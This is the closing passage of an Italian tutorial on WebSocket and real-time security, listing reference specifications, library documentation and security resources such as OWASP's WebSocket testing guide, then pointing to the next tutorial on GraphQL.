| `tutorial_13_autenticazione_autorizzazione.md` | Sessioni, revoca e rotazione dei token, che qui sono il punto debole |

---

## Risorse di riferimento

**Specifiche:** [RFC 6455 — The WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455), da leggere almeno nelle sezioni 4 (handshake) e 5 (framing) · [RFC 7692 — permessage-deflate](https://www.rfc-editor.org/rfc/rfc7692) · [WebSocket API su MDN](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)

**Documentazione:** [libreria `ws`](https://github.com/websockets/ws), che documenta bene i casi limite di `maxPayload` e `terminate` · [Socket.IO](https://socket.io/docs/v4/) e il suo [adapter Redis](https://socket.io/docs/v4/redis-adapter/) · [Server-Sent Events su MDN](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events)

**Sicurezza:** [OWASP — Testing WebSockets](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets) · [Cross-Site WebSocket Hijacking](http://www.christian-schneider.net/CrossSiteWebSocketHijacking.html), l'articolo che ha dato il nome all'attacco

---

> **Fine del Tutorial 23 — WebSocket e Sicurezza del Real-Time**
>
> Prossimo tutorial: `tutorial_24_graphql.md`
